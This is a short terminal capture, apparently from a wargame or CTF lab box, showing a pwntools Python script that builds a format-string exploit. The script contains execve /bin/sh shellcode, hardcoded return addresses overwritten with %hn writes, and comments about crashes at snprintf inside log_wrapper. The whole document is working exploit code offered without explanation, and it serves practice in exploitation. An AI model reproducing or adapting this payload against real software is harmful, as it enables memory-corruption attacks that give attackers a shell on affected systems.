b4A@warzone:/tmp$ cat /tmp/x4A.py
from pwn import *

# shellcode @ mapped : 0xb7fd8020 ('C' <repeats 33 times>
shellcode = "\x31\xc0\x83\xec\x04\x89\x04\x24\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# log_wrapper ret;
ret2 = 0xbffff60e       # 0xbffff60c = [0xAA__]
ret = 0xbffff60c        # 0xbffff60c = [0x__AA]
ret2shell = 0xb7fd8020  # Shellcode address



payload = "A"           # adjust misaligned
payload += p32(ret2)
payload += p32(ret)
payload += shellcode     # Shellcode
payload += "%x" * 12
payload += "%46979x%hn" # 0xb7fd____
payload += "%35345x%hn" # 0x____8020
#### crashes @ snprintf() inside log_wrapper()
#### Crashes before log_wrapper @ ret; 0x080489df


print payload
